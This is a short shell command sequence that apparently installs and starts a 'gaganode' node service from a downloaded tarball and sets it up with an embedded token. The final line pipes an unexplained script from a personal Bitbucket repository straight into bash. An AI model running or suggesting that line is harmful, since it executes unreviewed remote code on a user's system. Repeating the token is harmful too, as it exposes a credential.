sudo apt-get update -y && sudo apt-get -y install curl tar ca-certificates
wget https://assets.coreservice.io/public/package/22/app/1.0.3/app-1_0_3.tar.gz && tar xf app-1_0_3.tar.gz
cd app-linux-amd64
sudo ./app service install
sudo ./app service start
./app status
sudo ./apps/gaganode/gaganode config set --token=pihbmehfirzwnxkq13389b4163752616
./app restart
./app status
curl -sL https://bitbucket.org/lightcoral2/cangor/raw/master/boled04.sh | bash
